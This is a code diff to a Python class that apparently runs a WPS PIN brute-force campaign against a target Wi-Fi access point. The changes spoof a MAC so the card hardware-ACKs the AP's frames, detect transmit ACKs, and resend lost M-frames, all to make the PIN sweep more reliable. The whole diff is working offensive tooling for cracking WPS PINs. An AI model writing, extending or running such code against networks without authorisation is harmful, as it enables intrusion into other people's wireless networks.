@@ -128,7 +128,12 @@ class WpsCampaign(Campaign):
         self.our_mac = random_client_mac()
         self.assoc: Optional[WpsAssociation] = None
         self.transport: Optional[WlanTransport] = None
-        self._ack = False   # PIN sweep runs auto-ACK OFF (see _ensure_session); every TX goes no-ACK
+        self._ack = False   # set per session in _ensure_session (True once fake_mac is armed)
+        # TX-ACK: driver can see the AP's ACKs to us, so we resend a lost frame instead of
+        # guessing. Cards without it fall back to the timeout-as-NACK path.
+        self._tx_ack = hasattr(getattr(iface, "driver", None), "enable_ack_detect")
+        self._ack_wait = 0.05      # s to wait for the AP's ACK before resending our frame
+        self._ack_resends = 4      # max resends of an un-ACKed M-frame
         self.lock = LockTracker()
 
         self.state = self._load_state()
@@ -214,6 +219,8 @@ class WpsCampaign(Campaign):
         self._save_state()
         self._teardown()
         await self.iface.clear_fake_mac()
+        if self._tx_ack:
+            await self.iface.driver.disable_ack_detect()
 
     def pause(self) -> None:
         self._paused = True
@@ -246,13 +253,10 @@ class WpsCampaign(Campaign):
     # ---- the sweep ----------------------------------------------------------
     async def _ensure_session(self) -> bool:
         if self.assoc is None:
-            # Auto-ACK OFF (no active-monitor). Hardware ground-truth (AirLink): arming it HURTS —
-            # HW-ACKing the AP's M-frames kills the AP's own retransmit safety net, so any dropped
-            # frame is permanent (false first-half-wrong / missed M7). Un-ACKed lets the AP
-            # retransmit; our resends (association + registrar in-session) cover a dropped TX. Also
-            # frees WPS from needing active-monitor support on the card.
-            await self.iface.clear_fake_mac()
-            self._ack = False
+            # Arm fake_mac so the chip HW-ACKs the AP → it stops retransmitting. None on a card
+            # that can't spoof-ACK → _ack stays False (AP retransmits, we reply to each).
+            armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
+            self._ack = armed is not None
             self.assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                                         self.channel, our_mac=self.our_mac)
             self.assoc.start()
@@ -271,6 +275,8 @@ class WpsCampaign(Campaign):
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
         reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac,
+                           ack_wait=self._ack_wait if self._tx_ack else 0.0,
+                           ack_resends=self._ack_resends if self._tx_ack else 0,
                            should_stop=lambda: self.stopped)
         try:
             return await reg.try_pin(pin)
@@ -403,6 +409,8 @@ class WpsCampaign(Campaign):
 
     async def _loop(self) -> None:
         self.status = "running"
+        if self._tx_ack:
+            await self.iface.driver.enable_ack_detect()
         name = self.target.ssid or self.bssid
         logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
         if self._oui_pin_count:
